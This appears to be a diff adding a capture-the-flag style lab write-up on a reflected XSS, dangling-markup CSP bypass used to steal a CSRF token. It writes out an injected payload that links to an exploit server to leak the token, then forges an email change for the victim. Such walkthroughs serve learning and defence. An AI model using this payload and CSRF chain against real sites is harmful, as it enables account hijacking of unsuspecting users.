@@ -1,0 +1,56 @@
+User Role Can Be Modified in Profile – Reflected XSS via Dangling Markup & CSP Bypass
+
+Lab Difficulty: Expert
+Vulnerability: Reflected XSS / CSP Bypass / CSRF Token Theft
+
+Summary
+
+This lab was a fun one. The app had a reflected XSS in the email field, but the catch was a very strict CSP blocking scripts and external requests. So, the usual <script> injection wasn’t going to fly. The trick? Use a dangling markup attack combined with a <base target> trick to sneak the CSRF token out and change the victim’s email to hacker@evil-user.net. Basically, we’re manipulating how the browser interprets unclosed tags and window.name to bypass the CSP.
+
+Steps Taken
+
+Logged in with the provided credentials:
+wiener : peter
+
+Headed over to my profile page. The email field looked innocent:
+?email=input
+
+Tried injecting into the value attribute of the email input—classic reflected XSS. But with CSP in place, inline scripts and src tags were blocked. So I needed to break out of the attribute first.
+
+Closed the attribute with ", then added > to break out of the input. That gave me freedom to inject HTML directly into the DOM.
+
+Injected the payload:
+
+<a href="https://EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</a><base target="
+
+
+Nothing weird at first glance, but here’s the magic: the dangling <base target=" makes the browser store the value in window.name after the victim clicks the link.
+
+When the victim clicked the “Click me” link, their CSRF token got stuffed into window.name and redirected to my exploit server.
+
+Checked Burp Collaborator for the incoming request. Yep, CSRF token was there—grabbed it.
+
+Back in Burp, went to the change email request. Intercepted it, swapped the email with:
+
+hacker@evil-user.net
+
+
+and replaced the CSRF token with the one I just stole. Generated the auto-submit CSRF HTML, pasted it back into the exploit server, then delivered it to the victim.
+
+Click, redirect, done—the victim’s email got changed to hacker@evil-user.net. Lab complete.
+
+Root Cause
+
+The app reflected user input inside an attribute without proper encoding, and CSP was strict enough to block scripts but not enough to block this dangling markup trick. Browsers try to “fix” unclosed tags, which we exploited to hijack window.name and bypass CSP. Combined with CSRF, it allowed us to hijack the email update.
+
+Fixes and Mitigation
+
+Always properly encode user input in HTML attributes.
+
+Don’t rely solely on CSP for XSS protection.
+
+Consider using Content-Security-Policy: script-src 'nonce-…' or strict-dynamic to mitigate advanced bypasses.
+
+Validate critical actions server-side (like email changes) with proper CSRF protections.
+
+Be wary of dangling markup—unclosed tags can be surprisingly dangerous.
